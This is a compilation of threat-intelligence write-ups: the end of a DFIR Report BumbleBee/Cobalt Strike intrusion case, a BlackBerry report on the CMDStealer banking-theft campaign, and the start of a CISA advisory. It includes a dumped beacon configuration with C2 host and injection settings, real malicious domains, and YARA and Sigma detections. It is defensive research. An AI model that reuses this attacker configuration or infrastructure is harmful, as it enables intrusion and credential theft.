2796542 0x0005 jitter 0x0001 0x0002 48 0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100990b95ec8c7c882213d9afae50bc2f45ddf44795ab15a01de1db4356d5514af9f0ff9e4ddb58bb4499bf716be7d04128559449c06e494347bcb06f406a291dbd4df8a783aefd759c9c471ed03476c05dcbb3320413a79c07e45f3a6617354c548b0f076710f7c858070ada7d40627c98513f4a44492c4c30b68b30cea3802c33020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0x0008 server,get-uri 0x0003 0x0100 'dofixifa.com,/ro' 0x0043 DNS_STRATEGY 0x0001 0x0002 0 0x0044 DNS_STRATEGY_ROTATE_SECONDS 0x0002 0x0004 -1 0x0045 DNS_STRATEGY_FAIL_X 0x0002 0x0004 -1 0x0046 DNS_STRATEGY_FAIL_SECONDS 0x0002 0x0004 -1 0x000e SpawnTo 0x0003 0x0010 (NULL ...) 
0x001d spawnto_x86 0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe' 0x001e spawnto_x64 0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe' 0x001f CryptoScheme 0x0001 0x0002 0 0x001a get-verb 0x0003 0x0010 'GET' 0x001b post-verb 0x0003 0x0010 'POST' 0x001c HttpPostChunk 0x0002 0x0004 0 0x0025 license-id 0x0002 0x0004 0 0x0026 bStageCleanup 
0x0001 0x0002 1 0x0027 bCFGCaution 
0x0001 0x0002 0 0x0009 useragent 0x0003 0x0100 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202' 0x000a post-uri 0x0003 0x0040 '/styles' 0x000b Malleable_C2_Instructions 0x0003 0x0100 Transform Input: [7:Input,4,2:338,3,8] Print Remove 338 bytes from begin BASE64 NETBIOS lowercase 0x000c http_get_header 
0x0003 0x0200 Const_host_header Host: gmw.cn Const_header Connection: close Build Metadata:
[7:Metadata,8,3,2:wordpress_logged_in=,6:Cookie] NETBIOS lowercase BASE64 Prepend wordpress_logged_in= Header Cookie 0x000d http_post_header 0x0003 0x0200 Const_host_header Host: gmw.cn Const_header
Connection: close Const_header Accept-Encoding: gzip Const_header Content-Type: text/plain Build Output:
[7:Output,15,3,4] XOR with 4-byte random key BASE64 Print Build SessionId:
[7:SessionId,3,2:__session__id=,6:Cookie] BASE64 Prepend __session__id= Header Cookie 0x0036 HostHeader 0x0003 0x0080 (NULL ...) 
0x0032 UsesCookies 0x0001 0x0002 1 0x0023 proxy_type 0x0001 0x0002 2 IE settings 0x003a TCP_FRAME_HEADER 0x0003 0x0080 '\x00\x04' 0x0039 SMB_FRAME_HEADER 0x0003 0x0080 '\x00\x04' 0x0037 EXIT_FUNK 
0x0001 0x0002 0 0x0028 killdate 0x0002 0x0004 0 0x0029 textSectionEnd 0x0002 0x0004 155989 0x002a ObfuscateSectionsInfo 0x0003 0x0020 '\x00p\x02\x00á\x0b\x03\x00\x00\x10\x03\x00 ·\x03\x00\x00À\x03\x00\x1cÞ\x03' 0x002b process-inject-start-rwx 0x0001 0x0002 4 PAGE_READWRITE 0x002c process-inject-use-rwx 0x0001 0x0002 32 PAGE_EXECUTE_READ 0x002d process-inject-min_alloc 0x0002 0x0004
12128 0x002e process-inject-transform-x86 0x0003 0x0100 '\x00\x00\x00\x05\x90\x90\x90\x90\x90' 0x002f process-inject-transform-x64 0x0003 0x0100 '\x00\x00\x00\x05\x90\x90\x90\x90\x90' 0x0035 process-inject-stub 0x0003 0x0010 '2ÍAíð\x81\x0c[_I\x8eßG1Ìm' 0x0033 process-inject-execute 0x0003 0x0080 '\x01\x03\x04' 0x0034 process-inject-allocation-method 0x0001 0x0002 0 0x0000 Guessing Cobalt Strike version: 4.3 (max 0x0046) Default named pipes 
The threat actors used default CS configuration and default named pipes.
Named pipes were created in order to establish communication between CS processes: In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4}. 
Below is the full list of all default named pipes spotted during this intrusion: \postex_0dde \postex_3e9b \postex_4008 \postex_4429 \postex_55f8 \postex_8248 \postex_8c73 \postex_972d \postex_fc2e Named piped are commonly used by Cobalt Strike perform various techniques.
Here is a Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors @svch0st. 
AnyDesk As mentioned before in the lateral tool transfer section, threat actors remotely dropped AnyDesk binary on a server from the beachhead: A new service was created (Event ID 7045) upon the execution of AnyDesk installer: 
AnyDesk logs, %ProgramData%\AnyDesk\ad_svc.trace
and
%AppData%\AnyDesk\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion, using the Administrator account each time.
The usage of AnyDesk can be relatively easy to spot if you have the right logs (*.anydesk.com domains, AnyDesk user agent, etc.): 
The usage of AnyDesk also triggered two ET signatures: ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS
AnyDesk Remote Desktop Software User-Agent Again, those are quick wins to add to your detection capabilities to detect the usage of unauthorized remote administration tools, commonly used by ransomware operators AnyDesk configuration file and the network logs revealed that the id used was 159889039 and the source IP was 108.177.235.25 (LeaseWeb USA – Cloud Provider). 
Impact There was no impact (exfiltration, data encryption, or destruction) during this intrusion.
However, the observed TTPs show common cybercrime threat actors tradecraft which may have lead to domain wide ransomware had the threat actors had enough time. 
Indicators Files BC_invoice_Report_CORP_46.zip 5226b7138f4dd1dbb9f6953bd75a320b 6c87ca630c294773ab760d88587667f26e0213a3 c1b8e9d77a6aea4fc7bed4a2a48515aa32a3922859c9091cecf1b5f381a87127 document.lnk 3466ffaf086a29b8132e9e10d7111492 58739dc62eeac7374db9a8c07df7c7c36b550ce5 90f489452b4fe3f15d509732b8df8cc86d4486ece9aa10cbd8ad942f7880075e namr.dll f856d7e7d485a2fc5b38faddd8c6ee5c c68e4d5eaae99d6f0a51eec48ace79a4fede3c09 2d67a6e6e7f95d3649d4740419f596981a149b500503cbc3fcbeb11684e55218 wab.exe c68437cc9ed6645726119c12fdcb33e7 7a3db4b3359b60786fcbdaf0115191502fcded07 1cf28902be615c721596a249ca85f479984ad85dc4b19a7ba96147e307e06381 af.exe 9b02dd2a1a15e94922be3f85129083ac 2cb6ff75b38a3f24f3b60a2742b6f4d6027f0f2a b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682 VulnRecon.exe 5839b4013cf6e25568f13d3fc4120795 d9832b46dd6f249191e9cbcfba2222c1702c499a eb4cba90938df28f6d8524be639ed7bd572217f550ef753b2f2d39271faddaef VulnRecon.dll 951d017ba31ecc6990c053225ee8f1e6 a204f20b1c96c5b882949b93eb4ac20d4f9e4fdf a9e90587c54e68761be468181e56a5ba88bac10968ff7d8c0a1c01537158fbe8 CommandLine.dll 3654f4e4c0858a9388c383b1225b8384 974ffbfae36e9a41ac672f9793ce1bee18f2e670 fa2b74bfc9359efba61ed7625d20f9afc11a7933ebc9653e8e9b1e44be39c455 w.bat bba3ff461eee305c7408e31e427f57e6 3300c0c05b33691ecc04133885b7fc9513174746 59198ffaf74b0e931a1cafe78e20ebf0b16f3a5a03bb4121230a0c44d7b963d2 s.bat 4b78228c08538208686b0f55353fa3bf 67707f863aa405a9b9a335704808c604845394bf 5eb0b0829b9fe344bff08de80f55a21a26a53df7bd230d777114d3e7b64abd24 Network BumbleBee 142.91.3[.]109 45.140.146[.]30 Cobalt Strike 45.153.243[.]142 fuvataren[.]com 108.62.12[.]174 dofixifa[.]com Cobalt Strike Payload Hosting 104.243.33[.]50 Detections Network ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O) ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS
AnyDesk Remote Desktop Software User-Agent(Snort VRT) MALWARE-OTHER CobaltStrike powershell web delivery attempt Sigma https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/security/win_iso_mount.yml https://github.com/SigmaHQ/sigma/blob/d459483ef6bb889fb8da1baa17a713a4f1aa8897/rules/windows/file_event/file_event_win_iso_file_recent.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_rundll32_not_from_c_drive.yml https://github.com/SigmaHQ/sigma/blob/7f490d958aa7010f7f519e29bed4a45ecebd152e/rules/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_process_dump_rundll32_comsvcs.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_no_params.yml https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/sysmon/sysmon_lsass_memdump.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_whoami.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_adfind.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_network_anydesk.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_cobaltstrike_operator_bloopers_cmds.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/adfind_discovery https://github.com/SigmaHQ/sigma/blob/54d141eb585f38fc83a1dc15aa281a84c0416d4f/rules-deprecated/windows/powershell_suspicious_download.yml https://github.com/SigmaHQ/sigma/blob/b24e7ae9846f53cbbf61adad72f17af317c860a4/rules/windows/process_creation/proc_creation_win_susp_powershell_iex_patterns.yml https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/system/win_cobaltstrike_service_installs.yml https://github.com/SigmaHQ/sigma/blob/e10fa684bdd0254b5ba5102feae293b8564f4628/rules/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.yml https://github.com/SigmaHQ/sigma/blob/40adb0339e8e4b5286fc46e05b96e7b48e967e0c/rules/windows/process_creation/proc_creation_win_susp_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/58f1d6fa2c679198f2932e3c361d5fa827effa95/rules/network/zeek/zeek_susp_kerberos_rc4.yml https://github.com/SigmaHQ/sigma/blob/f4ef4fcdc4eb780bcaa59f6756bffa5b0fbacd20/rules/windows/builtin/security/win_susp_rc4_kerberos.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_susp_procdump.yml https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_anydesk.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2022-08-08 Identifier:
BumbleBee Case 13387 Reference: https://thedfirreport.com */ /*
Rule Set -----------------------------------------------------------------
*/ rule bumblebee_13387_VulnRecon_dll { meta: description = "BumbleBee - file VulnRecon.dll" author = "TheDFIRReport" reference = "https://thedfirreport.com" date = "2022-08-08" hash1 = "a9e90587c54e68761be468181e56a5ba88bac10968ff7d8c0a1c01537158fbe8" strings: $x1 = "Use VulnRecon.exe -i, --SystemInfo to execute this command" fullword wide $x2 = "Use VulnRecon.exe -v, --Vulnerability to execute this command" fullword wide $x3 = "Use VulnRecon.exe -h, --HotFixes to execute this command" fullword wide $x4 = "Use VulnRecon.exe -m, --MicrosoftUpdates to execute this command" fullword wide $x5 = "Use VulnRecon.exe -s, --SupportedCve to execute this command" fullword wide $s6 = "VulnRecon.dll" fullword wide $s7 = "VulnRecon.Commands.
SystemCommands" fullword ascii $s8 = "VulnRecon.
Commands.
CveCommands" fullword ascii $s9 = "VulnRecon.
Commands" fullword ascii $s10 = "VulnRecon.CommandLine" fullword ascii $s11 = "D:\\work\\rt\\VulnRecon\\VulnRecon\\obj\\Release\\net5.0\\VulnRecon.pdb" fullword ascii $s12 = "VulnRecon.Commands.
ToolsCommand" fullword ascii $s13 = "Using VulnRecon.exe -o or VulnRecon.exe --OptionName" fullword wide $s14 = "commandVersion" fullword ascii $s15 = "GetSystemInfoCommand" fullword ascii $s16 = "CreateGetSupportedCveCommand" fullword ascii $s17 = "CreateWindowsVersionCommand" fullword ascii $s18 = " <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii $s19 = "get_CommandVersion" fullword ascii $s20 = "<CommandVersion>k__BackingField" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 50KB and 1 of ($x*) and 4 of them } rule bumblebee_13387_VulnRecon_exe { meta: description = "BumbleBee - file VulnRecon.exe" author = "TheDFIRReport" reference = "https://thedfirreport.com" date = "2022-08-08" hash1 = "eb4cba90938df28f6d8524be639ed7bd572217f550ef753b2f2d39271faddaef" strings: $s1 = "hostfxr.dll" fullword wide $s2 = "--- Invoked %s
[version: %s, commit hash: %s] main = {" fullword wide $s3 = "This executable is not bound to a managed DLL to execute.
The binding value is: '%s'" fullword wide $s4 = "D:\\a\\_work\\1\\s\\artifacts\\obj\\win-x64.Release\\corehost\\cli\\apphost\\standalone\\Release\\apphost.pdb" fullword ascii $s5 = "VulnRecon.dll" fullword wide $s6 = "api-ms-win-crt-runtime-l1-1-0.dll" fullword ascii $s7 = " - %s&apphost_version=%s" fullword wide $s8 = "api-ms-win-crt-convert-l1-1-0.dll" fullword ascii $s9 = "api-ms-win-crt-math-l1-1-0.dll" fullword ascii $s10 = "api-ms-win-crt-time-l1-1-0.dll" fullword ascii $s11 = "api-ms-win-crt-stdio-l1-1-0.dll" fullword ascii $s12 = "api-ms-win-crt-heap-l1-1-0.dll" fullword ascii $s13 = "api-ms-win-crt-string-l1-1-0.dll" fullword ascii $s14 = "The managed DLL bound to this executable is: '%s'" fullword wide $s15 = "A fatal error was encountered.
This executable was not bound to load a managed DLL."
fullword wide $s16 = "api-ms-win-crt-locale-l1-1-0.dll" fullword ascii $s17 = "Showing error dialog for application: '%s' - error code: 0x%x - url: '%s'" fullword wide $s18 = "Failed to resolve full path of the current executable
[%s]" fullword wide $s19 = "https://go.microsoft.com/fwlink/?linkid=798306" fullword wide $s20 = "The managed DLL bound to this executable could not be retrieved from the executable image."
fullword wide condition: uint16(0) == 0x5a4d and filesize < 400KB and all of them } rule bumblebee_13387_wab { meta: description = "BumbleBee - file wab.exe" author = "TheDFIRReport" reference = "https://thedfirreport.com" date = "2022-08-08" hash1 = "1cf28902be615c721596a249ca85f479984ad85dc4b19a7ba96147e307e06381" strings: $s1 = "possibility terminate nation inch ducked ski accidentally usage absent reader rowing looking smack happily strings disadvantage " ascii $s2 = "pfxvex450gd81.exe" fullword ascii $s3 = "31403272414143" ascii /* hex encoded string '1@2rAAC' */ $s4 = "s wolf save detail surgery short vigour uttered fake proposal moustache accustomed lock been vegetable maximum ownership specifi" ascii $s5 = "130 Dial password %d propose7177!
Syllable( warrior stretching Angry 83) sabotage %s" fullword wide $s6 = "possibility terminate nation inch ducked ski accidentally usage absent reader rowing looking smack happily strings disadvantage " ascii $s7 = "accomplish course Content 506) arched organ Travels" fullword ascii $s8 = "123 serve edit.
693 Poison@ mercy " fullword wide $s9 = "Top wealthy!
fish 760? pier%complaint
July nicer!
587)
%s shark+ " fullword wide $s10 = " Approximate- Choked- %s %s, " fullword wide $s11 = "niece beacon dwelling-
Headlong Intellectual+" fullword ascii $s12 = ">Certainty holes) cherries Proceeding Active+ surname Rex/ gets" fullword wide $s13 = "+Enthusiastic@ Couple?
%s, shy %
d %d) plume " fullword wide $s14 = " again workroom front leader height mantle mother sudden illness discontent who finest southern nature supplement normally hopef" ascii $s15 = "Advantage %s+ Creation.
officially/
Affirmative %s?
%s " fullword ascii $s16 = "Mind@ falcon+ illumination repair/
%s! "
fullword ascii $s17 = "%Truthful- %d/ 161!
Checking 786/ Mob " fullword wide $s18 = "#%s. %s Door observed- lazy?
Quiet@ " fullword wide $s19 = "wrong comer?
%s) Designer$ 372" fullword wide $s20 = "Fleet( %d, lads.
%d!
%d %s 445" fullword wide condition: uint16(0) == 0x5a4d and filesize < 200KB and 8 of the MITRE Phishing – T1566Malicious File – T1204.002Windows Command Shell – T1059.003PowerShell – T1059.001Process Injection –
T1055File Deletion – T1070.004LSASS Memory – T1003.001Kerberoasting – T1558.003Domain Account – T1087.002Domain Trust Discovery – T1482Lateral Tool Transfer –
T1570Remote Desktop Protocol – T1021.001Valid Accounts – T1078Remote Access Software – T1219Ingress Tool Transfer – T1105Web Protocols – T1071.001System Services – T1569SMB/Windows Admin Shares – T1021.002Software Discovery – T1518System Network Configuration Discovery – T1016Remote System Discovery – T1018Process Discovery – T1057Mark-of-the-Web Bypass – T1553.005Masquerading – T1036Rundll32 – T1218.011Domain Groups – T1069.002Windows Management Instrumentation – T1047Password Guessing – T1110.001 Internal case #13387 
title: Operation CMDStealer:
Financially Motivated Campaign Leverages CMD-Based Scripts and LOLBaS for Online Banking Theft in Portugal, Peru, and Mexico url: https://blogs.blackberry.com/en/2023/05/cmdstealer-targets-portugal-peru-and-mexico Operation CMDStealer:
Financially Motivated Campaign Leverages CMD-Based Scripts and LOLBaS for Online Banking Theft in Portugal, Peru, and Mexico An unknown financially motivated threat actor, very likely from Brazil, is targeting Spanish- and Portuguese-speaking victims, with the goal of stealing online banking access.
The victims are primarily in Portugal, Mexico, and Peru.
This threat actor employs tactics such as LOLBaS (Living Off the Land Binaries and Scripts), along with CMD-based scripts to carry out its malicious activities. 
The campaign utilizes phishing emails in Portuguese and Spanish, and social engineering tactics to target victims.
The emails exploit commonly encountered issues, such as transit infractions and taxes, to create a sense of urgency and legitimacy in their phishing messages.
By posing as authoritative entities or government agencies, the messages are intended to deceive unsuspecting individuals and get them to disclose their online banking credentials. 
Brief MITRE ATT&CK:registered: Information Tactic Technique Initial Access T1566.001 Execution T1204.002, T1059.001, T1059.003, T1047, T1059.005, T1059.007 Defense Evasion T1027, T1140 Command and Control T1001, T1105, T1132.001, T1071.001 Discovery T1069, T1082, T1087 Exfiltration T1041 Credential Access T1555.003 Persistence T1547.009 Weaponization and Technical Overview Weapons CMD files, Autolt scripts Attack Vector Phishing Network Infrastructure Malicious domains Targets Portugal, Mexico, Peru Technical Analysis Context The Latin American threat landscape primarily consists of financially-motivated malware, usually compiled into the final PE payloads.
While deploying the final payloads, BlackBerry threat researchers saw a variety of techniques, such as abusing VBE scripts, ISO images, and MSI packages.
In this case, the threat actor behind the campaign used CMD-based scripts, AutoIt scripts, and LOLBaS. LOLBaS and CMD-based scripts help threat actors avoid detection by traditional security measures.
The scripts leverage built-in Windows:registered: tools and commands, allowing the threat actor to evade endpoint protection platform (EPP) solutions, and bypass security systems.
By utilizing these techniques, they can gain unauthorized access to victims' systems, extract sensitive information, and ultimately compromise online banking accounts and payment systems. 
The geographical focus of this threat actor centers on Portugal, Mexico, and Peru, where a significant number of Spanish and Portuguese speakers reside.
Their selection of countries is likely influenced by the prevalence of online banking usage in these regions, making them lucrative targets for financial fraud. 
The first .CMD file set seen to use AutoIt in its execution was discovered at the end of 2021.
This suggests that the threat actor was beginning its tests, naming these files “demo” or “test,” upon decompiling the AutoIt script into a human-readable script that supports the timeline of this attack campaign. 
Figure 1 – CMDStealer files with a very low detection rate on Virus Total Operation CMDStealer Attack Vector 
The infection chain begins with the user receiving a phishing email.
These phishing emails are specially crafted to grab victims’ attention.
In one instance, we observed one of the emails titled “Multa de Trânsito,“ which translates from Portuguese as “traffic infraction ticket.”
Each email has an HTML attachment. 
Figure 2 – Phishing email contents The email text employs scare tactics, such as evidence of a traffic violation, prompting the user to open the HTML attachment which contains some junk code and data in HEX format. 
Figure 3 – "multa_de_transito_502323.html" attachment content The data blob in HEX decodes to a slightly obfuscated URL address which upon cleanup translates to: hxxps[:]//multa-ansr-pt[.]fun/?hcBViJAi9EZSc3YQwxpEwfmD7xdG0IF34EWGHj6Q. This URL resolves to: 162.0.232[.]115 IP address.
During the extensive analysis of the “.HTML” files, BlackBerry identified a large list of HEX-encoded URLs, some of which are listed here: hxxps[:]//factura61[.]click/2/?j5szsmo0bk8tOSQSMS4mmp1XtQrmbNYoCB2GBem8 hxxps[:]//factura61[.]click/2/?vzlv9CZ1gnLrNIaWBJBhJNWRCt7IVXDDwVzOQhSs hxxps[:]//sunat-pe[.]fun/?D80gaUJDUfuLG6lodTSEi7qoqciBWk5xE5w81pJO hxxps[:]//factura61[.]click/2/?CTtBmkRN8KPXVTgUn1ArCPGb5WXTXTaT7etdD7TC hxxps[:]//factura61[.]click/2/?yqJl8r7henupax3WsUvITb0PuSw5sn7HyZWGMvDv hxxps[:]//factura61[.]click/2/?GxkVBvEBTFfSDqaFr8Yjw9kyKH01xRseHoF0DNQc hxxps[:]//multa-ansr-pt[.]fun/?UFqQBhFaXulvEfeTbI38FFDKRth1r2DWKOFqUI0Y hxxps[:]//multa-ansr-pt[.]fun/?l4mm0DEhDbJPYd5qAQmwst09TDTjjvYjiG7ByCvx Opening the attached “multa_de_transito_502323.html” file triggers the embedded JavaScript and reaches out to hxxps[:]//multa-ansr-pt[.]fun/?hcBViJAi9EZSc3YQwxpEwfmD7xdG0IF34EWGHj6Q to pull down the next stage which is a compressed archive (RAR) file. 
The archive file is typically titled with one of the naming schemes (a few are listed below): doc-Impuestos_<[0-9]{6}>.rar doc-Impostos_<[0-9]{6}>.rar Documento_Impostos_<[0-9]{6}>.rar Multa_<[0-9]{6}>.rar Impuestos-Documento_<[0-9]{6}>.rar BlackBerry found different campaigns geofenced to each specific country.
Threat researchers reported similar campaigns in the past targeting Mexico. 
Weaponization The contents of the previously mentioned archive include a single “.CMD” file typically titled from one of the following filenames, (but there are other names): doc-Impuestos.cmd doc-Impostos.cmd Impuestos-Documento.cmd doc_Factura.cmd Documento_Impostos.cmd The “.CMD” file is large, ranging between 1.34 - 1.37MBs, and consists of two base64 encoded data blobs and code instructions for its execution.
The script is described in the SANS write-up released on 1/06/2023. 
Figure 4 – Code instructions for both base64 data block execution The first base64 data blob is compiled AutoIt script and the second is AutoIt interpreter (a benign file), used to run the first file. 
The purpose of the AutoIt script is to enumerate the host and download a “.VBS” file which then gets executed via the “SHELLEXECUTE”.
Next, it invokes the “_OUTRECOVERY()” function to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys. 
The script is then instructed to call the “_CHROMERECOVERY()” function.
It proceeds by downloading the “sqlite3.dll” file from “hxxps[:]//www[.]autoitscript[.]com/autoit3/pkgmgr/sqlite/” which will be required later during the Chrome password theft. 
All data is then sent back to the attacker's C2 via the HTTP POST method.
The C2 is constructed with the victim's enumerated data, where the values are: v1 – OS language (e.g., 1033 – English US) v2 – keyboard layout (e.g., 1033 – English US) v3 – operating system version (Windows 7,8,10,11 or unknown) v4 – is target an admin or user v5 – OS architecture (x86 or x64) 
The URL then becomes: hxxp[:]//publicpressmagazine[.]com/images/swan/do/it[.]php?b1=1&v1=1033&v2=1033&v3=windows%2010&v4=admin&v5=x86 hxxp[:]//websylvania[.]com/psj/do/it[.]php?b1=1&v1=3082&v2=1034&v3=windows%207&v4=user&v5=x64 To gain persistence on the infected system, it relies on the following code: Figure 5 – Persistence in the system Notably, within the decompiled AutoIt scripts that were used to target Mexico, a list of Mexican banks was also specified.
If found, some of that data was sent back to the attacker. 
Figure 6 – Financial targets in Mexico Based on the URLs of the financial targets in Mexico, the threat actor behind CMDStealer is highly interested in compromising enterprise/business accounts. 
Operation CMDStealer Network Infrastructure The phishing and C2 (command and control) infrastructure are hosted on services with numerous domains associated with a single address, including fast flux services.
Such services go a long way in obfuscating NetFlow traffic analysis and infrastructure tracking. 
The domains utilized also heavily use redacted “whois” information and obscure registration data.
Every stage of this stealer uses domains that have redacted information for years. 
Multiple hosts were identified communicating with most of the CMD Stealer’s C2, but communications were not reliable enough to confirm threat actor ownership. 
Campaigns have utilized the same URL path */do/it.php since at least 8/20/2022, making it a reasonable path to alert. 
Targets This attack primarily targets victims in Portugal, Mexico, and Peru.
Also, based on the configuration used to target victims in Mexico, the threat actor is interested in online business accounts, which usually have a better cash flow. 
Attribution Based on the code and language analysis, research is confident that the threat actor behind this campaign belongs to Latin America, specifically Brazil. 
Conclusions Defending against LOLBaS executions requires a multi-layered strategy.
First, organizations should implement robust endpoint security solutions to detect and block suspicious behavior and unauthorized execution of LOLBaS. Additionally, organizations should enforce the principle of least privilege, such as zero trust, confirming that users have only the permissions necessary to perform their tasks, thus limiting potential impact of LOLBaS execution.
Regular security awareness training should be provided to educate employees about the risks associated with social engineering.
Continuous monitoring and auditing of system logs can also help detect and investigate any suspicious activities related to LOLBaS. APPENDIX 1 – Referential Hashes SHA256 f6e84e43323ed9d8531fa2aeeb3c181c8f84fcbe950ce6dcdd8c3fa0b02c6cc0 MD5 e64f28174f646e26199d6b7735c84195 SHA256 0a277e51598ef364d5e0006817d32487eb9c0a3c150b7169cbc0bb7348088e63 MD5 f7f602f9b7fd04b64fbafe4dbfefa066 SHA256 2d87b9b071ace9f2ebfa33c1c0c21202f39876b312e135a491bf57ba731b798c MD5 fdcc1e1e3ccf30c63660e1f75042be43 SHA256 40017793f40a192b1dfdfc960742dd539b19fee9b15213307c8319fd88eee57f MD5 e212e8d740310cc565bc89c3b7966804 SHA256 cb1d1f039c07bd03b6eb14248a897dcefdefc28ae6f523b7c6f549c3c155640b APPENDIX 2 – Applied Countermeasures Yara Rules Available on request (see below). 
Suricata Rule Available on request (see below). 
Disclaimer:
The private version of this report is available on request.
It includes but is not limited to the complete and contextual MITRE ATT&CK:registered: mapping, MITRE D3FEND:trade_mark: countermeasures, Attack Flow by MITRE, and other threat detection content for tooling, network traffic, complete IOCs list, and system behavior.
For more information, email BlackBerry at cti@blackberry.com. 
For similar articles and news delivered straight to your inbox, subscribe to the BlackBerry Blog. 
About The BlackBerry Research & Intelligence Team The BlackBerry Research & Intelligence team examines emerging and persistent threats, providing intelligence analysis for the benefit of defenders and the organizations they serve. 
title: AA20-336A: Advanced Persistent Threat Actors Targeting U.S. Think Tanks url: https://us-cert.cisa.gov/ncas/alerts/aa20-336a Original release date: December 1, 2020SummaryThis Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK:registered:) framework.
See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques. 
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) have observed persistent continued cyber intrusions by advanced persistent threat (APT) actors targeting U.S. think tanks.
This malicious activity is often, but not exclusively, directed at individuals and organizations that focus on international affairs or national security policy.[1]
The following guidance may assist U.S. think tanks in developing network defense procedures to prevent or rapidly detect these attacks. 
APT actors have relied on multiple avenues for initial access.
These have included low-effort capabilities such as spearphishing emails and third-party message services directed at both corporate and personal accounts, as well as exploiting vulnerable web-facing devices and remote connection capabilities.
Increased telework during the COVID-19 pandemic has expanded workforce reliance on remote connectivity, affording malicious actors more opportunities to exploit those connections and to blend in with increased traffic.
Attackers may leverage virtual private networks (VPNs) and other remote work tools to gain initial access or persistence on a victim’s network.
When successful, these low-effort, high-reward approaches allow threat actors to steal sensitive information, acquire user credentials, and gain persistent access to victim networks. 
Given the importance that think tanks can have in shaping U.S. policy, CISA and FBI urge individuals and organizations in the international affairs and national security sectors to immediately adopt a heightened state of awareness and implement the critical steps listed in the Mitigations section of this Advisory. 
Click here for a PDF version of this report. 
Technical DetailsATT&CK Profile CISA created the following MITRE ATT&CK profile to provide a non-exhaustive list of tactics, techniques, and procedures (TTPs) employed by APT actors to break through think tanks’ defenses, conduct reconnaissance in their environments, exfiltrate proprietary or confidential information, and execute effects on targets.
These TTPs were included based upon closed reporting on APT actors that are known to target think tanks or based upon CISA incident response data. 
Initial Access [TA0001] Valid Accounts [T1078] Valid Accounts: Cloud Accounts
[T1078.004] External Remote Services [T1133] Drive-by Compromise [T1189] Exploit Public-Facing Application [T1190] Supply Chain Compromise: Compromise Software Supply Chain
[T1195.002] Trusted Relationship [T1199] Phishing:
Spearphishing Attachment [T1566.001] Phishing:
Spearphishing Link [T1566.002] Phishing: Spearphishing via Service [T1566.003] Execution [TA0002] Windows Management Instrumentation
[T1047] Scheduled Task/Job: Scheduled Task
[T1053.005] Command and Scripting Interpreter:
PowerShell
[T1059.001] Command and Scripting Interpreter:
Windows Command Shell [T1059.003] Command and Scripting Interpreter:
Unix Shell [T1059.004] Command and Scripting Interpreter:
Visual Basic [T1059.005] Command and Scripting Interpreter:
Python
[T1059.006] Native API [T1106] Exploitation for Client Execution [T1203] User Execution: Malicious Link [T1204.001] User Execution: Malicious File [T1204.002] Inter-Process Communication: Dynamic Data Exchange
[T1559.002] System Services:
Service Execution [T1569.002] Persistence [TA0003] Boot or Logon Initialization Scripts: Logon Script (Windows)
[T1037.001] Scheduled Task/Job: Scheduled Task
[T1053.005] Account Manipulation:
Exchange Email Delegate Permissions [T1098.002] Create Account: Local Account [T1136.001] Office Application Startup: Office Test [T1137.002] Office Application Startup:
Outlook Home Page [T1137.004] Browser Extensions [T1176] BITS Jobs
[T1197] Server Software Component: Web Shell [T1505.003] Pre-OS Boot:
Bootkit [T1542.003] Create or Modify System Process:
Windows Service [T1543.003] Event Triggered Execution: Change Default File Association
[T1546.001] Event Triggered Execution: Windows Management Instrumentation Event Subscription
[T1546.003] Event Triggered Execution: Accessibility Features
[T1546.008] Event Triggered Execution:
Component Object Model Hijacking
